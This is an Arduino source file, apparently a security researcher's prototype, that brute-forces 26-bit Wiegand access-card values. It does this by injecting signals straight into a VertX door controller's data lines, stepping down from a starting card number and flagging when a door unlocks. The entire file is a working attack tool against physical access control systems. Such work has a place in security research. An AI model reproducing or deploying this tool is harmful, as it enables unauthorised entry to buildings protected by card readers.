/* Wiegand BruteForcer 
*  Brad Antoniewicz
*  foundstone
*
* This is a prototype for a Wiegand protocol brute forcer
*
* The user provides a starting value via Serial, the Arduino
* is connected to DATA0 and DATA1, and attempts to brute force
* another value. 
* 
* Arduino Pinouts:
*        8 - Output to VertX Data 0 (Green)
*        9 - Output to VertX Data 1 (White)
*        GND - To VertX Ground (Black)
*
* 26-Bit Wiegand Format: 
* Bit 1 = Even Parity over Bits 2 - 13
* Bits 2 - 9 = Facility Code (0 to 255) Bit 2 is MSB
* Bits 10 - 25 = ID Number (0 to 65,535) Bit 10 is MSB
* Bits 26 Odd parity over bits 14 to 25
*
*
* Disclaimer - I know this code is REALLY sloppy and inefficient
*          Please don't judge me :)
*/

#define CARD_LEN 26
unsigned long cardValue = 0;

int toVertX_D0 = 8; // output DATA0 (Green) to Controller
int toVertX_D1 = 9; // output DATA1 (White) to Controller

int incomingByte = 0; 
int sInputCount = 0;

void resetState() {
  Serial.println("[+] Reseting State...");
  delay(10);
  Serial.flush();
  sInputCount=0;
}

void writeCard(unsigned long sendValue) {
    Serial.println("[-] Sending Manual Input:");
    Serial.print("\t");
    for (short x=CARD_LEN; x>=0; x--) {
      if ( bitRead(sendValue,x) == 1 ) {
        Serial.print("1"); 
        digitalWrite(toVertX_D1, LOW);
        delayMicroseconds(34);
        digitalWrite(toVertX_D1, HIGH);
      } else if ( bitRead(sendValue,x) == 0 ) {
        Serial.print("0");
        digitalWrite(toVertX_D0, LOW);
        delayMicroseconds(34);
        digitalWrite(toVertX_D0, HIGH);
      }
      delay(2);
    }
    Serial.println();
 }

void processInput(int byte) {
   if (byte == 49) { // DECIMAL 1
     sInputCount++; 
     bitSet(cardValue, CARD_LEN - sInputCount);
   } else if (byte == 48) { // DECIMAL 0
      sInputCount++; 
      bitClear(cardValue, CARD_LEN - sInputCount);
     
  } else {
      Serial.println("[!] Recieved invalid Value!");
      resetState();
     }
}

void printCardData(unsigned long data) {
    int serialNumber = (data >> 1) & 0x3fff;
    int siteCode = (data >> 17) & 0x3ff;
    Serial.print("\tH: ");
    Serial.print(data,HEX);
    Serial.print(" SC: ");
    Serial.print(siteCode);
    Serial.print(" C: ");
    Serial.println(serialNumber);
    Serial.print("\tB: ");
    Serial.println(data, BIN);
}

void setup()
{
  Serial.begin(38400);
   /* This stuff is for the Door Sensor LED */
  pinMode(13, OUTPUT); 
  pinMode(11, INPUT); // Reader 1
  pinMode(12, INPUT); // Reader 2
  // End Door Sensor Stuff
  
   delay(10);
  pinMode(toVertX_D0,OUTPUT);
  digitalWrite(toVertX_D0, HIGH);

  pinMode(toVertX_D1,OUTPUT);
  digitalWrite(toVertX_D1, HIGH);
  
  sInputCount = 0; 
 
  Serial.println("Please provide a starting tag value");
  Serial.println("For Binary input, it must be 26 bits long");
  Serial.println("No parity needs, just add two 0's to the beginning");
  Serial.println("e.g. 00001001100011111110010101");
}

void loop() {
  
  /* This stuff is for the Door Sensor LED */
  int reader1Status = digitalRead(11);
  int reader2Status = digitalRead(12);
  if ( reader1Status == HIGH || reader2Status == HIGH ) {
    Serial.println("---  D o o r  U n l o c k e d ---");
    digitalWrite(13, LOW);
    delay(2000);
    digitalWrite(13, HIGH);
   }else {
    digitalWrite(13, HIGH); 
   }

  // End Door Sensor Stuff
  

  if (Serial.available() > 0 ) {
    
    incomingByte = Serial.read();
    Serial.print(".");
    delay(10);
   
    processInput(incomingByte);
    if ( ( sInputCount > 0 ) && ( sInputCount != CARD_LEN ) && ( Serial.peek() == -1 ) ) {
          Serial.println("\n[!] Invalid Input Length!");
          resetState();
        }
     }
  if (sInputCount == CARD_LEN) {
      Serial.println("");
          Serial.println("[-] Got Card Value:");
          printCardData(cardValue);
          
          Serial.println("[+] Starting Decremental Bruteforce");
          for (unsigned long c=cardValue-1; c>=0; c--) {
            Serial.println("[-] Trying:");
            printCardData(c);
            writeCard(c); 
            delay(200); // Any delay less than this will result in skipped values
          }
     } else if (sInputCount > CARD_LEN) {
          Serial.println("[!] Sorry, looks like your input was too long.. ");
          resetState();
      }
}
